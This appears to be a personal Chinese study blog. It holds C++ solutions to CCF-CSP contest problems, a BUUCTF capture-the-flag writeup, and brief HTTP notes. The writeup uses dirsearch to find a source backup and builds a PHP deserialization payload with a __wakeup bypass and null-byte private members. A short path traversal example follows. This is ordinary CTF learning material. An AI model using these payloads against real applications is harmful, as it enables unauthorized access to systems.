<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> M 12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 1005</span></span><br><span class="line"><span class="type">int</span> a[N][M];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> n,m;</span><br><span class="line">	cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">	<span class="type">int</span> i,j,k;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;m;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			cin&gt;&gt;a[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">bool</span> p=<span class="literal">true</span>; <span class="comment">//判断有无上级仓库 </span></span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="type">bool</span> pd=<span class="literal">true</span>;</span><br><span class="line">			<span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;m;k++)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span>(a[i][k]&gt;=a[j][k]) </span><br><span class="line">				&#123;</span><br><span class="line">					pd=<span class="literal">false</span>;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>(pd) <span class="comment">//说明是上级仓库</span></span><br><span class="line">			&#123;</span><br><span class="line">				cout&lt;&lt;j&lt;&lt;endl;</span><br><span class="line">				p=<span class="literal">false</span>;</span><br><span class="line">				<span class="keyword">break</span>; <span class="comment">//只要上级最小的 </span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(p)</span><br><span class="line">		&#123;</span><br><span class="line">			cout&lt;&lt;<span class="number">0</span>&lt;&lt;endl;</span><br><span class="line">		&#125; </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="202312-2-因子化简"><a href="#202312-2-因子化简" class="headerlink" title="202312-2 因子化简"></a>202312-2 因子化简</h5><p>题目链接：<a target="_blank" rel="noopener" href="http://118.190.20.162/view.page?gpid=T179">http://118.190.20.162/view.page?gpid=T179</a></p>
<p>对于待分解的数x，从小到大遍历所有可能的因数，可以被x整除就一直除以这个因数，直到x被分解完毕</p>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_74172965/article/details/135090693?spm=1001.2101.3001.6650.4&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-4-135090693-blog-135080223.235%5Ev43%5Epc_blog_bottom_relevance_base6&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-4-135090693-blog-135080223.235%5Ev43%5Epc_blog_bottom_relevance_base6&utm_relevant_index=9">CCF-CSP真题202312-2因子化简(C++满分题解)_202312-2 试题名称: 因子化简-CSDN博客</a></p>
<p>代码：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> LL;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> q;</span><br><span class="line">    cin&gt;&gt;q;</span><br><span class="line">    LL res;</span><br><span class="line">    LL n;</span><br><span class="line">    <span class="type">int</span> k;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;q;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        res=<span class="number">1</span>;</span><br><span class="line">        n=<span class="number">0</span>;</span><br><span class="line">        k=<span class="number">0</span>;</span><br><span class="line">        cin&gt;&gt;n;</span><br><span class="line">        cin&gt;&gt;k;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;=n/i;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> coef=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span>(n%i==<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                n/=i;</span><br><span class="line">                coef++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//某项指数大于等于制定阈值k，此项才会保留，否则不计入结果</span></span><br><span class="line">            <span class="keyword">if</span>(coef&gt;=k) res*=<span class="built_in">pow</span>(i,coef);</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;res&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Buuctf"><a href="#Buuctf" class="headerlink" title="Buuctf"></a>Buuctf</h4><h4 id="16-PHP"><a href="#16-PHP" class="headerlink" title="16 PHP"></a>16 PHP</h4><p>题目提示了备份网站</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/18c18833-30dc-498d-acf7-4095c042798c" alt="image"></p>
<p>使用目录扫描工具 dirsearch</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wuhongbin/p/14048052.html">目录扫描工具 dirsearch 使用详解 - FreeK0x00 - 博客园 (cnblogs.com)</a></p>
<p>可以直接到github上下载压缩包，解压后，进入目录运行cmd</p>
<p>首先安装dirsearch：<code>python setup.py install</code></p>
<p>如果报错，可能是因为pip版本太低，更新pip：<code>python -m pip install --upgrade pip</code></p>
<p>运行，开始扫描：<code>py -3.9 dirsearch.py -u http://15349308-86d1-4f57-8e2c-50b34e5d48eb.node4.buuoj.cn:81/ -e php</code></p>
<p>响应成功的如下图所示</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/523abcab-1ce7-4f1a-95e0-6c457c786dd0" alt="image"></p>
<p>访问<a target="_blank" rel="noopener" href="http://www.zip文件,下载了一个压缩包/">www.zip文件，下载了一个压缩包</a></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/c166170d-069f-4d99-acb4-e75a2c6ac3fc" alt="image"></p>
<p>（常见的黑客备份文件有<a target="_blank" rel="noopener" href="http://www.tar.gz和www.zip,尝试www.zip可直接得到文件)/">www.tar.gz和www.zip，尝试www.zip可直接得到文件）</a></p>
<p>解压得到一系列文件</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9be93ca0-b413-4787-8b29-3115eec2be45" alt="image"></p>
<p>查看index.php文件，发现包含class.php文件，采用get传参select，还有个php反序列化函数unserialize()，所以这道题应该是PHP反序列化的题目。</p>
<p>所以页面可以传进一个参数<code>select</code>然后把它反序列化，反序列化的过程中会用到class.php</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/917331c7-3a19-4c6a-b5b8-2d08ca263360" alt="image"></p>
<p>查看class.php文件，有输出flag的条件</p>
<p>要调用到__destruct（）并且<code>password=100,username=admin</code>才能<code>echo $flag</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ae9dc2e9-205f-41ab-916a-2d1f257c26ed" alt="image"></p>
<p>魔术方法，反序列化知识点可参考<a target="_blank" rel="noopener" href="https://dbqyw.github.io/2024/01/24/PHP/">https://dbqyw.github.io/2024/01/24/PHP/</a></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">在反序列化脚本结束时会自动调用它，它是unserialize()结束的魔术方法（魔法函数）</span><br><span class="line"></span><br><span class="line">魔术方法</span><br><span class="line">通常来说有一些PHP的魔法函数会导致反序列化漏洞，如：</span><br><span class="line">__construct 当一个对象创建时自动调用</span><br><span class="line">__destruct 当对象被销毁时自动调用 (php绝大多数情况下会自动调用销毁对象)</span><br><span class="line">__sleep() 使**用serialize()函数时触发</span><br><span class="line">__wakeup 使用unserialse()**函数时会自动调用</span><br><span class="line">__toString 当一个对象被当作一个字符串被调用。</span><br><span class="line">__call() 在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() 在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() 用于从不可访问的属性读取数据//调用私有属性时使用</span><br><span class="line">__set() 用于将数据写入不可访问的属性</span><br><span class="line">__isset() 在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() 在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString() 把类当作字符串使用时触发,返回值需要为字符串</span><br><span class="line">__invoke() 当脚本尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure>

<p>构造序列化，php代码：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Name</span><br><span class="line">&#123;</span><br><span class="line">    private $username = &quot;yesyesyes&quot;;</span><br><span class="line">    private $password = &quot;nonono&quot;;</span><br><span class="line">    public function __construct($username,$password)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;username=$username;</span><br><span class="line">        $this-&gt;password=$password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new Name(@admin,100);</span><br><span class="line">//var_dump($a);</span><br><span class="line">//echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">$b = serialize($a);</span><br><span class="line">echo $b.&quot;&lt;br&gt;&quot;;//输出序列化</span><br><span class="line">echo urlencode($b);//输出url编码后的序列化</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>序列化后是这样的：</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/92a4085c-3183-425c-90bf-5175c5f4b940" alt="image"></p>
<p>调用unserialize()时会自动调用魔法函数wakeup(),可以通过改变属性数绕过，把Name后面的2改为3或以上即可</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:3:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>

<p>然后url识别不了”，改为%22</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:%22Name%22:3:&#123;s:14:%22Nameusername%22;s:5:%22admin%22;s:14:%22Namepassword%22;i:100;&#125;</span><br></pre></td></tr></table></figure>

<p>因为成员（属性）是private，所以要在类名和成员名前加%00这个url编码是空的意思。因为生产序列化时不会把这个空也输出。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:%22Name%22:3:&#123;s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;i:100;&#125;</span><br></pre></td></tr></table></figure>


<p>完整payload：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?select=O:4:%22Name%22:3:&#123;s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;i:100;&#125;</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ed749694-f9ae-4d63-a042-26d448f40f32" alt="image"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/01/31/20240131/" data-id="cls1fqbrd000058vfblbc7b66" data-title="20240131" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/learn/" rel="tag">learn</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Web-Basic" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/01/31/Web-Basic/" class="article-date">
  <time class="dt-published" datetime="2024-01-31T06:16:00.000Z" itemprop="datePublished">2024-01-31</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/01/31/Web-Basic/">Web-Basic</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h4 id="HTTP基础知识"><a href="#HTTP基础知识" class="headerlink" title="HTTP基础知识"></a>HTTP基础知识</h4><h5 id="请求行"><a href="#请求行" class="headerlink" title="请求行"></a>请求行</h5><p>请求行由三个标记组成：请求方法、请求URL和HTTP版本，它们用空格分隔</p>
<p>例如：GET &#x2F;index.html HTTP&#x2F;1.1</p>
<p>HTTP规划定义了8中可能的请求方法</p>
<ul>
<li>GET：请求指定的页面信息，并返回实体主体</li>
<li>POST：向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的建立和&#x2F;或已有资源的修改</li>
<li>HEAD：类似于get请求，只不过返回的响应中没有具体的内容，用于获取报头，服务器只返回状态行和头标，不返回请求文档</li>
<li>PUT：从客户端向服务器传送的数据取代指定的文档的内容</li>
<li>DELETE：请求服务器删除指定的页面</li>
<li>OPTIONS：关于服务器支持的请求方法信息的请求</li>
<li>TRACE：web服务器反馈Http请求和其头标的请求</li>
<li>CONNECT：已文档化，但当前未实现的一个方法，预留做隧道处理</li>
</ul>
<h5 id="请求头"><a href="#请求头" class="headerlink" title="请求头"></a>请求头</h5><p>由关键字／值对组成，每行一对，关键字和值用冒号分隔，请求头标通知服务器用于客户端的功能和标识</p>
<ul>
<li>HOST:主机或域名地址</li>
<li>Accept:指浏览器或其他客户可以接受的MIME文件格式，Servlet可以根据它判断并返回适当的文件格式</li>
<li>User－Agent:是客户浏览器名称</li>
<li>Host:对应网址URL中的web名称和端口号</li>
<li>Accept－Language:指出浏览器可以接受的语言种类，如en或en－us，指英语</li>
<li>connection:用来告诉服务器是否可以维持固定的HTTP连接，http是无连接的，HTTP／１.１</li>
</ul>
<h5 id="Web漏洞"><a href="#Web漏洞" class="headerlink" title="Web漏洞"></a>Web漏洞</h5><p>文件包含漏洞 ..&#x2F;..&#x2F;..&#x2F;..&#x2F;</p>
<p>想访问的文件，与url目录文件所在的文件夹相差几个文件夹，就写几个..&#x2F;</p>
<p>如，想访问 WWW\xx.php</p>
<p>但是url所获取的是 WWW\pikachu\vul\dir\soup\1.php</p>
<p>相差四个，所以把1.php改为..&#x2F;..&#x2F;..&#x2F;..&#x2F;xx.php</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/01/31/Web-Basic/" data-id="cls1greba0000govf9i4u8abi" data-title="Web-Basic" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li></ul>

    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzzing/" rel="tag">Fuzzing</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/learn/" rel="tag">learn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/security/" rel="tag">security</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" rel="tag">论文细读</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/CTF/" style="font-size: 17.5px;">CTF</a> <a href="/tags/Fuzzing/" style="font-size: 17.5px;">Fuzzing</a> <a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 15px;">Web安全</a> <a href="/tags/learn/" style="font-size: 12.5px;">learn</a> <a href="/tags/security/" style="font-size: 10px;">security</a> <a href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" style="font-size: 20px;">论文细读</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/02/">February 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2024/02/15/20240215/">20240215</a>
          </li>
        
          <li>
            <a href="/2024/02/14/20240214/">20240214</a>
          </li>
        
          <li>
            <a href="/2024/02/08/Paper-IvySyn%20Automated%20Vulnerability%20Discovery%20in%20Deep%20Learning%20Frameworks/">IvySyn</a>
          </li>
        
          <li>
            <a href="/2024/02/07/Web-File2/">Web-File2</a>
          </li>
        
          <li>
            <a href="/2024/02/06/Web-File1/">Web-File1</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2024 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>